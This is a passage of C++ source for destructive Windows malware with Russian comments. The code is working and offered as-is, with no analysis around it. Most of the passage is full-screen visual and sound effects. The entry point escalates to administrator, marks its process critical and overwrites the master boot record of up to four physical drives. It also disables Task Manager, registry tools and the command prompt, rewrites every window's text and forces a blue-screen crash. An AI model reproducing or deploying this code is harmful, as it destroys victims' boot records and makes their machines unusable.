    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    
    int phase = 0;
    double totalShiftX = 0;
    double totalShiftY = 0;
    
    while (!stopEffects) {
        hdc = GetDC(0);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        phase++;
        
        // Постоянная скорость
        totalShiftX += 6.0;
        totalShiftY += 4.0;
        
        // Зиг-заг
        double zigzag = 35.0 * sin(phase * 0.07 + totalShiftX * 0.008);
        double zigzagY = 15.0 * cos(phase * 0.05 + totalShiftY * 0.01);
        
        for (int y = 0; y < h; y += 2) {
            int offsetX = (int)(zigzag * (1.0 - (double)y / h) + totalShiftX * 0.3);
            int offsetY = (int)(zigzagY * (1.0 - (double)y / h) + totalShiftY * 0.3 + y * 0.01);
            
            BitBlt(hdc, offsetX, y + offsetY, w, 2, mdc, 0, y, SRCCOPY);
            
            if (abs(offsetX) > 5 || abs(offsetY) > 5) {
                BLENDFUNCTION bf = {AC_SRC_OVER, 0, 15, 0};
                AlphaBlend(hdc, offsetX/2, y + offsetY/2, w, 2, mdc, 0, y, w, 2, bf);
                AlphaBlend(hdc, offsetX/4, y + offsetY/4, w/2, 2, mdc, 0, y, w/2, 2, bf);
            }
        }
        
        static HDC tailDC = NULL;
        static HBITMAP tailBmp = NULL;
        if (!tailDC) {
            tailDC = CreateCompatibleDC(hdc);
            tailBmp = CreateCompatibleBitmap(hdc, w, h);
            SelectObject(tailDC, tailBmp);
        }
        
        BLENDFUNCTION bf = {AC_SRC_OVER, 0, 30, 0};
        AlphaBlend(hdc, 0, 0, w, h, tailDC, 0, 0, w, h, bf);
        BitBlt(tailDC, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
        
        if (totalShiftX > w * 1.2 || totalShiftY > h * 1.2) {
            totalShiftX = 0;
            totalShiftY = 0;
            InvalidateRect(0, 0, 0);
        }
        
        ReleaseDC(0, hdc);
        SoundThread(200 + rand() % 2000, 30 + rand() % 80, rand() % 10);
        Sleep(15 + rand() % 20);
    }
    
    DeleteDC(mdc);
    DeleteObject(bmp);
    return 0;
}

// ==================== ЭФФЕКТ 18: МУТАЦИЯ ПРОСТРАНСТВА ====================
DWORD WINAPI spaceMutation(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int size = w * h;
    COLORREF* pixels = new COLORREF[size];
    HDC hdc = GetDC(0);
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateBitmap(w, h, 1, 32, pixels);
    SelectObject(mdc, bmp);
    int phase = 0;
    while (!stopEffects) {
        hdc = GetDC(0);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(bmp, size * 4, pixels);
        phase++;
        int mutation = rand() % 4;
        for (int y = 0; y < h; y += 2) {
            for (int x = 0; x < w; x += 2) {
                int idx = y * w + x, nx = x, ny = y;
                switch (mutation) {
                    case 0: nx = x + (int)(20 * sin(y * 0.02 + phase * 0.02)); ny = y + (int)(20 * cos(x * 0.02 + phase * 0.02)); break;
                    case 1: nx = x + (int)(30 * sin(x * 0.01 + y * 0.02 + phase * 0.03)); ny = y + (int)(30 * cos(y * 0.01 + x * 0.02 + phase * 0.03)); break;
                    case 2: nx = (x + (int)(50 * sin(phase * 0.01 + x * 0.005))) % w; ny = (y + (int)(50 * cos(phase * 0.013 + y * 0.005))) % h; break;
                    case 3: {
                        int cx = w/2, cy = h/2;
                        int dx = x - cx, dy = y - cy;
                        double dist = sqrt((double)(dx * dx + dy * dy));
                        double angle = atan2((double)dy, (double)dx) + phase * 0.005;
                        nx = cx + (int)((dist + 50 * sin(dist * 0.01 + phase * 0.01)) * cos(angle));
                        ny = cy + (int)((dist + 50 * sin(dist * 0.01 + phase * 0.01)) * sin(angle));
                        break;
                    }
                }
                nx = max(0, min(w - 1, nx));
                ny = max(0, min(h - 1, ny));
                int nidx = ny * w + nx;
                pixels[nidx] = pixels[idx];
            }
        }
        SetBitmapBits(bmp, size * 4, pixels);
        BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        SoundThread(100 + rand() % 3000, 20 + rand() % 60, rand() % 10);
        Sleep(10 + rand() % 20);
    }
    delete[] pixels;
    DeleteDC(mdc);
    DeleteObject(bmp);
    return 0;
}

// ==================== ЭФФЕКТ 19: ТЕКСТУРНЫЙ ШУМ ====================
DWORD WINAPI textureNoise(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int phase = 0;
    while (!stopEffects) {
        HDC hdc = GetDC(0);
        phase++;
        for (int y = 0; y < h; y += 2) {
            for (int x = 0; x < w; x += 2) {
                int val = (rand() % 256) ^ (phase + x + y);
                int r = (val + phase) % 255, g = (val + phase * 2 + 50) % 255, b = (val + phase * 3 + 100) % 255;
                int pattern = (x + y + phase) % 10;
                if (pattern < 3) SetPixel(hdc, x, y, RGB(r, g, b));
                else if (pattern < 6) SetPixel(hdc, x, y, RGB(g, b, r));
                else SetPixel(hdc, x, y, RGB(b, r, g));
                if ((x + y + phase) % 4 == 0) SetPixel(hdc, x + 1, y, RGB(255 - r, 255 - g, 255 - b));
            }
        }
        ReleaseDC(0, hdc);
        SoundThread(200 + rand() % 2000, 20 + rand() % 60, rand() % 10);
        Sleep(10 + rand() % 20);
    }
    return 0;
}

// ==================== ЭФФЕКТ 20: СВЕТОВОЙ ХАОС ====================
DWORD WINAPI lightChaos(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(0);
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    int phase = 0;
    while (!stopEffects) {
        hdc = GetDC(0);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        phase++;
        for (int i = 0; i < 30; i++) {
            int cx = rand() % w, cy = rand() % h, radius = 20 + rand() % 100;
            for (int a = 0; a < 360; a += 5) {
                int px = cx + (int)(radius * cos(a * M_PI / 180 + phase * 0.01));
                int py = cy + (int)(radius * sin(a * M_PI / 180 + phase * 0.01));
                if (px >= 0 && px < w && py >= 0 && py < h) {
                    int col = (a + phase) % 360;
                    SetPixel(hdc, px, py, RGB((int)(128 + 127 * sin(col * M_PI / 180)),
                                              (int)(128 + 127 * sin((col + 120) * M_PI / 180)),
                                              (int)(128 + 127 * sin((col + 240) * M_PI / 180))));
                }
            }
        }
        BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(0, hdc);
        SoundThread(300 + rand() % 2000, 20 + rand() % 60, rand() % 10);
        Sleep(15 + rand() % 25);
    }
    DeleteDC(mdc);
    DeleteObject(bmp);
    return 0;
}

// ==================== ЭФФЕКТ 21: ФИНАЛЬНЫЙ ХАОС ====================
DWORD WINAPI finalChaos(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int size = w * h;
    COLORREF* pixels = new COLORREF[size];
    HDC hdc = GetDC(0);
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateBitmap(w, h, 1, 32, pixels);
    SelectObject(mdc, bmp);
    int phase = 0;
    while (!stopEffects) {
        hdc = GetDC(0);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(bmp, size * 4, pixels);
        phase++;
        for (int y = 0; y < h; y += 3) {
            for (int x = 0; x < w; x += 3) {
                int idx = y * w + x, type = (x + y + phase) % 5;
                COLORREF c = pixels[idx];
                int col, nidx, noise;
                switch (type) {
                    case 0: pixels[idx] = RGB(GetBValue(c), GetRValue(c), GetGValue(c)); break;
                    case 1: nidx = ((y + phase) % h) * w + ((x + phase) % w); pixels[idx] = pixels[nidx] ^ (phase * 0x010101); break;
                    case 2: col = (x + y + phase) % 360; pixels[idx] = RGB((int)(128 + 127 * sin(col * M_PI / 180)), (int)(128 + 127 * sin((col + 120) * M_PI / 180)), (int)(128 + 127 * sin((col + 240) * M_PI / 180))); break;
                    case 3: noise = rand() % 100 - 50; pixels[idx] = RGB((GetRValue(c) + noise + phase) % 255, (GetGValue(c) + noise + phase * 2) % 255, (GetBValue(c) + noise + phase * 3) % 255); break;
                    case 4: pixels[idx] = RGB(255 - GetRValue(c), 255 - GetGValue(c), 255 - GetBValue(c)); break;
                }
            }
        }
        for (int i = 0; i < 20; i++) {
            int x1 = rand() % w, y1 = rand() % h, x2 = rand() % w, y2 = rand() % h, col = rand() % 360;
            HPEN pen = CreatePen(PS_SOLID, rand() % 3 + 1, RGB((int)(128 + 127 * sin(col * M_PI / 180)), (int)(128 + 127 * sin((col + 120) * M_PI / 180)), (int)(128 + 127 * sin((col + 240) * M_PI / 180))));
            SelectObject(hdc, pen);
            MoveToEx(hdc, x1, y1, NULL);
            LineTo(hdc, x2, y2);
            DeleteObject(pen);
        }
        SetBitmapBits(bmp, size * 4, pixels);
        BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        SoundThread(50 + rand() % 4000, 10 + rand() % 50, rand() % 10);
        Sleep(5 + rand() % 15);
    }
    delete[] pixels;
    DeleteDC(mdc);
    DeleteObject(bmp);
    return 0;
}

// ==================== СТАНДАРТНЫЕ ФУНКЦИИ ====================
BOOL EnablePriv(LPCSTR lpszPriv) {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));
    if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;
    if (!LookupPrivilegeValueA(NULL, lpszPriv, &luid)) { CloseHandle(hToken); return FALSE; }
    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

BOOL ProcessIsCritical() {
    HMODULE hDLL = LoadLibraryA("ntdll.dll");
    if (hDLL) {
        EnablePriv("SeDebugPrivilege");
        typedef VOID(_stdcall* RtlSetProcessIsCritical)(IN BOOLEAN, OUT PBOOLEAN, IN BOOLEAN);
        RtlSetProcessIsCritical fSetCritical = (RtlSetProcessIsCritical)GetProcAddress(hDLL, "RtlSetProcessIsCritical");
        if (fSetCritical) { fSetCritical(1, 0, 0); return 1; }
    }
    return 0;
}

void reg_add(HKEY HKey, LPCSTR Subkey, LPCSTR ValueName, unsigned long Type, unsigned int Value) {
    HKEY hKey;
    DWORD dwDisposition;
    RegCreateKeyExA(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
    RegSetValueExA(hKey, ValueName, 0, Type, (const unsigned char*)&Value, (int)sizeof(Value));
    RegCloseKey(hKey);
}

DWORD WINAPI MBRWiper(LPVOID lpParam) {
    BYTE customMBR[512] = {
        0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xBB,
        0x34, 0x12, 0x89, 0xD8, 0x35, 0xBF, 0x8E, 0x05, 0x5B, 0x63, 0xC1, 0xC0, 0x03, 0x31, 0xC8, 0x89,
        0xC3, 0x26, 0x88, 0x05, 0x47, 0xE2, 0xEB, 0xBB, 0x00, 0x00, 0xBE, 0x00, 0x00, 0x89, 0xF0, 0xD1,
        0xE8, 0xBA, 0x00, 0x00, 0xB9, 0x0A, 0x00, 0xF7, 0xF1, 0x89, 0xC5, 0xB9, 0x00, 0x00, 0x89, 0xC8,
        0xD1, 0xE0, 0x01, 0xF0, 0x25, 0x1F, 0x00, 0x89, 0xC2, 0xB8, 0x14, 0x00, 0xF7, 0xE2, 0xC1, 0xE8,
        0x05, 0x01, 0xE8, 0x89, 0xC2, 0x81, 0xFA, 0xC8, 0x00, 0x7D, 0x1A, 0x81, 0xFA, 0x00, 0x00, 0x7C,
        0x14, 0x89, 0xD0, 0xBA, 0x40, 0x01, 0xF7, 0xE2, 0x01, 0xC8, 0x89, 0xC7, 0xB0, 0x0F, 0x00, 0xC8,
        0x30, 0xD0, 0x26, 0x88, 0x05, 0x41, 0x81, 0xF9, 0x40, 0x01, 0x7C, 0xC2, 0x46, 0x81, 0xFE, 0xC8,
        0x00, 0x7C, 0xAA, 0xBB, 0x00, 0x00, 0x89, 0xD8, 0x35, 0xAD, 0xDE, 0x25, 0x0F, 0x00, 0x05, 0x04,
        0x00, 0x89, 0xC6, 0x89, 0xD8, 0x35, 0xFE, 0xCA, 0x25, 0xFF, 0x01, 0x3D, 0x40, 0x01, 0x7D, 0x3B,
        0x89, 0xC7, 0x89, 0xD8, 0x35, 0xEF, 0xBE, 0x25, 0xFF, 0x00, 0x3D, 0xC8, 0x00, 0x7D, 0x2C, 0x89,
        0xC5, 0x53, 0x56, 0x51, 0x52, 0x89, 0xF9, 0x89, 0xEA, 0x89, 0xD0, 0xBA, 0x40, 0x01, 0xF7, 0xE2,
        0x01, 0xC8, 0x89, 0xC7, 0x88, 0xD8, 0x00, 0xC8, 0x30, 0xD0, 0x26, 0x88, 0x05, 0x5A, 0x59, 0x41,
        0x39, 0xF1, 0x7C, 0xDF, 0x42, 0x39, 0xF2, 0x7C, 0xDA, 0x5E, 0x5B, 0x43, 0x81, 0xFB, 0x64, 0x00,
        0x7C, 0xA4, 0xB9, 0x00, 0xFA, 0xBF, 0x00, 0x00, 0x26, 0x8A, 0x05, 0x34, 0xFF, 0x26, 0x88, 0x05,
        0x47, 0xE2, 0xF5, 0xE9, 0x1C, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
    };
    DWORD dwBytesWritten;
    for (int i = 0; i < 4; i++) {
        char path[32]; sprintf(path, "\\\\.\\PhysicalDrive%d", i);
        HANDLE hDevice = CreateFileA(path, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
        if (hDevice != INVALID_HANDLE_VALUE) {
            WriteFile(hDevice, customMBR, 512, &dwBytesWritten, 0);
            CloseHandle(hDevice);
        }
    }
    return 1;
}

DWORD WINAPI texts(LPVOID lpParam) {
    while (true) {
        EnumChildWindows(GetDesktopWindow(), [](HWND hwnd, LPARAM lParam) -> BOOL {
            SendMessageTimeoutA(hwnd, WM_SETTEXT, NULL, (LPARAM)"SYSTEM CORRUPTED", SMTO_ABORTIFHUNG, 100, NULL);
            return TRUE;
        }, NULL);
        Sleep(50);
    }
}

BOOL IsAdmin() {
    BOOL b = FALSE;
    PSID pAdmin = NULL;
    SID_IDENTIFIER_AUTHORITY auth = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&auth, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &pAdmin)) {
        CheckTokenMembership(NULL, pAdmin, &b);
        FreeSid(pAdmin);
    }
    return b;
}

// ==================== ТОЧКА ВХОДА ====================
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    if (!IsAdmin()) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        SHELLEXECUTEINFOA sei = {sizeof(sei)};
        sei.lpVerb = "runas";
        sei.lpFile = path;
        sei.nShow = SW_HIDE;
        ShellExecuteExA(&sei);
        ExitProcess(0);
    }

    ShowWindow(GetConsoleWindow(), SW_HIDE);
    ProcessIsCritical();
    CreateThread(0, 0, MBRWiper, 0, 0, 0);

    reg_add(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", REG_DWORD, 1);
    reg_add(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", REG_DWORD, 1);
    reg_add(HKEY_CURRENT_USER, "SOFTWARE\\Policies\\Microsoft\\Windows\\System", "DisableCMD", REG_DWORD, 2);

    CreateThread(0, 0, texts, 0, 0, 0);
    Sleep(1000);

    // 21 ЭФФЕКТ (добавлены 2 новых: маятник, эскалатор)
    DWORD(WINAPI* effects[21])(LPVOID) = {
        fullSpin, rgbHell, pixelMutation, thousandPieces, chaosWaves,
        mirrorHell, explosionMash, kaleidoscopeChaos, stretchShift, movingChaosNoise,
        colorChannelBreak, radialExplosion, gradientChaos, starChaos, dancingBlocks,
        pendulumSwing, escalator, spaceMutation, textureNoise, lightChaos,
        finalChaos
    };

    srand((unsigned)GetTickCount());

    for (int i = 0; i < 21; i++) {
        HANDLE hThread = CreateThread(0, 0, effects[i], 0, 0, 0);
        if (!hThread) continue;

        int freq = 50 + rand() % 4000;
        int dur = 200 + rand() % 2000;
        int type = rand() % 10;
        PlaySoundEffect(freq, dur, type);

        Sleep(100);
        PlaySoundEffect(freq + 500, dur / 2, (type + 3) % 10);

        Sleep(15000 + rand() % 10000);
        stopEffects = true;
        WaitForSingleObject(hThread, 1000);
        TerminateThread(hThread, 0);
        CloseHandle(hThread);
        stopEffects = false;
        InvalidateRect(0, 0, 0);
        Sleep(200);
    }

    // BSOD
    BOOLEAN bl;
    NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
    RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
    RtlAdjustPrivilege(19, 1, 0, &bl);
    NtRaiseHardError(0xC0000229, 0, 0, 0, 6, NULL);

    Sleep(-1);
    return 0;
}
